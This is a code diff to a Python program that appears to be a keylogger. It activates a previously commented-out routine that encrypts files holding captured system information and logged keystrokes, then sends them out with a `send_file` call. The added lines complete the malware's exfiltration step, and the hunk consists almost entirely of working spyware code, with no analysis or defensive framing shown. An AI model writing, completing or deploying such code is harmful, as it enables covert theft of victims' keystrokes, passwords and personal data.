@@ -302,26 +302,26 @@ def encrypt_gnupg(email, key, file_to_encrypt, encrypted_file):
             output=encrypted_file + '.gpg')
     return encrypted_file
 
-# Fernet Encryption - May be implemented later
-# def fernetEncrypt():
-#     filesToEncrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
-#     encryptedFileNames = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]
 
-#     count = 0
+def fernet_encrypt():
+    files_to_encrypt = [extendedPath + system_information, extendedPath + keys_information]
+    encrypted_file_names = [extendedPath + system_information_e, extendedPath + keys_information_e]
 
-#     for encryptingFile in filesToEncrypt:
+    count = 0
 
-#         with open(filesToEncrypt[count], 'rb') as f:
-#             data = f.read()
+    for encrypting_file in files_to_encrypt:
 
-#         fernet = Fernet(key)
-#         encrypted = fernet.encrypt(data)
+        with open(files_to_encrypt[count], 'rb') as f:
+            data = f.read()
 
-#         with open(encryptedFileNames[count], 'wb') as f:
-#             f.write(encrypted)
+        fernet = Fernet(key)
+        encrypted = fernet.encrypt(data)
 
-#         ### SEND ENCRYPTED FILES TO SERVER HERE ###
-#         #sendFile()
-#         count += 1
+        with open(encrypted_file_names[count], 'wb') as f:
+            f.write(encrypted)
 
-#     time.sleep(120)
+        count += 1
+    send_file(file_path + extend + system_information_e, True)
+    time.sleep(20)
+    send_file(file_path + extend + keys_information_e, False)
+    time.sleep(30)
